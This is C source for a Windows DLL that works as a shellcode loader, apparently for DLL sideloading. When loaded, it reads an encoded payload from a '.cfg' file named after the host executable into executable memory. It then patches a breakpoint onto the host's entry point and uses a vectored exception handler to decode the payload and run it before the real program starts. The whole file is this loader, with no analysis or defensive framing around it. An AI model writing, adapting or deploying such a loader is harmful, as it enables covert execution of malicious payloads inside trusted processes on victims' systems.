#include <Windows.h>
#include <imagehlp.h>

LPVOID p_shellcode = NULL;
DWORD shellcode_size = 0;

BYTE entry_byte = 0;

void decode(LPVOID buf, int size) {
    unsigned char *p = buf;
    for(int i=0; i<size; ++i) {
        p[i] = p[i] - i;
    }
    return;
}

void bp_entry(LPVOID base) {
    PIMAGE_DOS_HEADER p_dos = NULL;
    PIMAGE_NT_HEADERS p_nt = NULL;
	PBYTE p_entry = NULL;
	DWORD old_prot = 0;

    p_dos = (PIMAGE_DOS_HEADER)base;
	p_nt = (PIMAGE_NT_HEADERS)((PBYTE)base + p_dos->e_lfanew);
	p_entry = (PBYTE)base+p_nt->OptionalHeader.AddressOfEntryPoint;
	entry_byte = p_entry[0];
	VirtualProtect(p_entry, 1, PAGE_EXECUTE_READWRITE, &old_prot);
	p_entry[0] = 0xcc;
	VirtualProtect(p_entry, 1, old_prot, &old_prot);
	return;
}

void u_bp_entry(LPVOID base) {
	PIMAGE_DOS_HEADER p_dos = NULL;
	PIMAGE_NT_HEADERS p_nt = NULL;
	PBYTE p_entry = NULL;
	DWORD old_prot = 0;

	p_dos = (PIMAGE_DOS_HEADER)base;
	p_nt = (PIMAGE_NT_HEADERS)((PBYTE)base + p_dos->e_lfanew);
	p_entry = (PBYTE)base+p_nt->OptionalHeader.AddressOfEntryPoint;

	VirtualProtect(p_entry, 1, PAGE_EXECUTE_READWRITE, &old_prot);
	p_entry[0] = entry_byte;
	VirtualProtect(p_entry, 1, old_prot, &old_prot);
}

LONG handler(EXCEPTION_POINTERS pexc) {
    u_bp_entry(GetModuleHandle(NULL));
    decode(p_shellcode, shellcode_size);
    ((void (*)())p_shellcode)();
    return EXCEPTION_CONTINUE_EXECUTION;
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    BYTE filename[256];
    DWORD name_len = 0;

    // Perform actions based on the reason for calling.
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            // Initialize once for each new process.
            // Return FALSE to fail DLL load.
            name_len = GetModuleFileNameA(NULL, filename, 256);
            filename[name_len-3] = 'c';
            filename[name_len-2] = 'f';
            filename[name_len-1] = 'g';

            HANDLE h_shellcode = CreateFileA(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
            shellcode_size = GetFileSize(h_shellcode, NULL);
            p_shellcode = VirtualAlloc(NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            DWORD num_read = 0;
            ReadFile(h_shellcode, p_shellcode, shellcode_size, &num_read, NULL);
            CloseHandle(h_shellcode);

            AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)handler);
            
            bp_entry(GetModuleHandle(NULL));

            break;

        case DLL_THREAD_ATTACH:
            // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
            // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
            // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}